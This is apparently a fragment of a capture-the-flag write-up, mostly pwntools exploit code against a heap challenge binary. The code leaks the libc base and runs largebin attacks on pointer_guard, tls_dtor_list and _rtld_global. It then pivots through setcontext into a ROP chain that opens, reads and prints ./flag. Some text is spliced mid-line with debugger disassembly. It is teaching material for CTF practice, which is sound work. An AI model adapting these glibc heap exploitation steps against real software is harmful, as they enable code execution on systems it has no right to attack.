    add(1,0x460)#1
    add(2,0x418)#2
    add(3,0x440)#3
    add(4,0x410)#4
    #---free(1) and show(1)---    pay = free(1,0)
    pay += show(1,0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #-------------------------    #---------leak------------    libc_base = u64(ru(b'\x7f')[-6:].ljust(0x8,b'\x00')) - main_arena - 96
    su('libc_base',libc_base)
    pointer_guard_addr = libc_base - 0x2890
    tls_dtor_list_addr = libc_base - 0x2918
    su('pointer_guard_addr',pointer_guard_addr)
    su('tls_dtor_list_addr',tls_dtor_list_addr)
    set_context = libc_base + libc.sym['setcontext'] + 61
    fh = libc.sym['__free_hook']+libc_base
    #0x000000000005dfd1 : mov rax, rdi ; ret 
    #0x0000000000169e90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
    binsh_addr = libc_base + next(libc.search(b'/bin/sh\0'))
    ret = libc_base + libc.sym['setcontext'] + 334
    syscall = next(libc.search(asm("syscall\nret")))+libc_base
    #---------------------------------------    
    #------largebin attack and leak heap----    pay = free(3,0)
    pay += edit(1,0x20,p64(0)*3+p64(pointer_guard_addr-0x20),0)
    pay += add(5,0x500,0)#5
    pay += show(1,0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    ru('Malloc Done\n')
    heap = u64(r(6).ljust(8,b'\0')) - 0x2f50
    su('heap',heap)
    pay = edit(1,0x20,p64(heap+0x2f50)+p64(libc_base+main_arena+1120)+p64(heap+0x2f50)+p64(heap+0x2f50),0)
    pay += edit(3,0x20,p64(libc_base+main_arena+1120)+p64(heap+0x26c0)+p64(heap+0x26c0)+p64(heap+0x26c0),0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #---------------------------------------    
    add(1,0x460)#1
    add(3,0x440)#3
    #------largebin attack ------------------    free(1)
    pay = free(3,0)
    pay += edit(1,0x20,p64(0)*3+p64(tls_dtor_list_addr-0x20),0)
    pay += add(5,0x500,0)#5
    pay += show(1,0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    ru('Malloc Done\n')
    heap = u64(r(6).ljust(8,b'\0')) - 0x2f50
    su('heap',heap)
    pay = edit(1,0x20,p64(heap+0x2f50)+p64(libc_base+main_arena+1120)+p64(heap+0x2f50)+p64(heap+0x2f50),0)
    pay += edit(3,0x20,p64(libc_base+main_arena+1120)+p64(heap+0x26c0)+p64(heap+0x26c0)+p64(heap+0x26c0),0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #---------------------------------------    #0x0000000000169e90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
    #--------------------------------------    pay = add(1,0x460,0)#1
    pay+=free(2,0)#0
    pay+=add(2,0x430,0)#1
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #--------------------------------------    
    rop = (0x0000000000169e90+libc_base)^(heap+0x2f50)
    rop = ((rop>>(64-0x11))|(rop    call   qword ptr [r14]
     ► 0x7ffff7fd9f03     mov    rdx, r14                      
       0x7ffff7fd9f06     sub    r14, 8
       0x7ffff7fd9f0a     cmp    qword ptr [rbp - 0x38], rdx
       0x7ffff7fd9f0e     jne    _dl_fini+512                
       0x7ffff7ddf8fd :    mov    rsp,QWORD PTR [rdx+0xa0]
       0x7ffff7ddf904 :    mov    rbx,QWORD PTR [rdx+0x80]
       0x7ffff7ddf90b :    mov    rbp,QWORD PTR [rdx+0x78]
       0x7ffff7ddf90f :    mov    r12,QWORD PTR [rdx+0x48]
       0x7ffff7ddf913 :    mov    r13,QWORD PTR [rdx+0x50]
       0x7ffff7ddf917 :    mov    r14,QWORD PTR [rdx+0x58]
       0x7ffff7ddf91b :    mov    r15,QWORD PTR [rdx+0x60]
       0x7ffff7ddf91f :    test   DWORD PTR fs:0x48,0x2
###  exp
    #!/usr/bin/env python3
    #coding=utf-8
    from pwn import*
    import os
    context.log_level = 'debug'
    context.arch='amd64'
    binary = './pwn' 
    main_arena = 2198624
    s = lambda buf: io.send(buf)
    sl = lambda buf: io.sendline(buf)
    sa = lambda delim, buf: io.sendafter(delim, buf)
    sal = lambda delim, buf: io.sendlineafter(delim, buf)
    shell = lambda: io.interactive()
    r = lambda n=None: io.recv(n)
    ra = lambda t=tube.forever:io.recvall(t)
    ru = lambda delim: io.recvuntil(delim)
    rl = lambda: io.recvline()
    rls = lambda n=2**20: io.recvlines(n)
    su = lambda buf,addr:io.success(buf+"==>"+hex(addr))
    #context.terminal = ['tilix', '-x', 'sh', '-c']
    #context.terminal = ['tilix', 'splitw', '-v']
    local = 1
    if local == 1:
        io=process(binary)
    else:
        io=remote()
    elf=ELF(binary)
    #libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    def add(index,size,flag=1):
        pay = b'\x01'
        pay += p8(index)
        pay += p16(size)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    def free(index,flag=1):
        pay = b'\x02'
        pay += p8(index)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    def show(index,flag=1):
        pay = b'\x03'
        pay += p8(index)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    def edit(index,size,content,flag=1):
        pay = b'\x04'
        pay += p8(index)
        pay += p16(size)
        pay += content
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    add(0,0x410)#0
    add(1,0x460)#1
    add(2,0x418)#2
    add(3,0x440)#3
    add(4,0x410)#4
    #---free(1) and show(1)---    pay = free(1,0)
    pay += show(1,0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #-------------------------    #---------leak------------    libc_base = u64(ru(b'\x7f')[-6:].ljust(0x8,b'\x00')) - main_arena - 96
    su('libc_base',libc_base)
    _rtld_global = libc_base+0x26F040
    offset = _rtld_global+0x1790
    set_context = libc_base + libc.sym['setcontext'] + 61
    binsh_addr = libc_base + next(libc.search(b'/bin/sh\0'))
    ret = libc_base + libc.sym['setcontext'] + 334
    fh = libc.sym['__free_hook'] + libc_base
    syscall = next(libc.search(asm("syscall\nret")))+libc_base
    #-------------------------    
    #------largebin attack and leak heap----    pay = free(3,0)
    pay += edit(1,0x20,p64(0)*3+p64(_rtld_global-0x20),0)
    pay += add(5,0x500,0)#5
    pay += show(1,0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    ru('Malloc Done\n')
    heap = u64(r(6).ljust(8,b'\0')) - 0x2f50
    su('heap',heap)
    pay = edit(1,0x20,p64(heap+0x2f50)+p64(libc_base+main_arena+1120)+p64(heap+0x2f50)+p64(heap+0x2f50),0)
    pay += edit(3,0x20,p64(libc_base+main_arena+1120)+p64(heap+0x26c0)+p64(heap+0x26c0)+p64(heap+0x26c0),0)
    pay += b'\x05'
    ru("Pls input the opcode\n")
    s(pay)
    #---------------------------------------    
    add(1,0x460)#1
    add(3,0x440)#3
    payload = p64(0) + p64(offset) + p64(0) + p64(heap + 0x2f50)#chunk
    payload += p64(set_context) + p64(ret)
    rdx = len(payload)-8 
    payload = payload.ljust(0x70+rdx,b'\0')+p64(fh&0xfffffffffffff000)#rsi
    payload = payload.ljust(0x68+rdx,b'\0')+p64(0)#rdi
    payload = payload.ljust(0x88+rdx,b'\0')+p64(0x2000)#rdx
    payload = payload.ljust(0xa0+rdx,b'\0')+p64((fh&0xfffffffffffff000)+8)#bytes(frame)
    payload = payload.ljust(0xa0+rdx,b'\0')+p64(syscall)#rip
    payload = payload.ljust(0x100,b'\x00')
    payload += p64(heap + 0x2f50 + 0x10 + 0x110)*0x3#chunk_addr = chunk+0x960
    payload += p64(0x10)
    payload = payload.ljust(0x31C - 0x10,b'\x00')
    payload += p8(0x8) + b'\x00'*4
    edit(3,len(payload),payload)
    payload = b'\0'*0x410+p64(heap+0x2f70)
    edit(2,len(payload),payload)
    pop_rdx_r12_ret = 0x0000000000122431+libc_base
    layout = [next(libc.search(asm('pop rdi\nret')))+libc_base
        ,fh&0xfffffffffffff000
        ,next(libc.search(asm('pop rsi\nret')))+libc_base
        ,0
        ,p64(pop_rdx_r12_ret)
        ,p64(0)
        ,p64(0)
        ,next(libc.search(asm('pop rax\nret')))+libc_base
        ,2
        ,syscall
        ,next(libc.search(asm('pop rdi\nret')))+libc_base
        ,3
        ,next(libc.search(asm('pop rsi\nret')))+libc_base
        ,(fh&0xfffffffffffff000)+0x200
        ,p64(pop_rdx_r12_ret)
        ,p64(0x30)
        ,p64(0)
        ,next(libc.search(asm('pop rax\nret')))+libc_base
        ,0
        ,syscall
        ,next(libc.search(asm('pop rdi\nret')))+libc_base
        ,1
        ,next(libc.search(asm('pop rsi\nret')))+libc_base
        ,(fh&0xfffffffffffff000)+0x200
        ,p64(pop_rdx_r12_ret)
        ,p64(0x30)
        ,p64(0)
        ,next(libc.search(asm('pop rax\nret')))+libc_base
        ,1
        ,syscall]
    shellcode=b'./flag'.ljust(8,b'\x00')+flat(layout)
    #gdb.attach(proc.pidof(io)[0])
    add(1,0x550)
    ru(b'ERROR\n')
    s(shellcode)
    shell()
## 资料参考：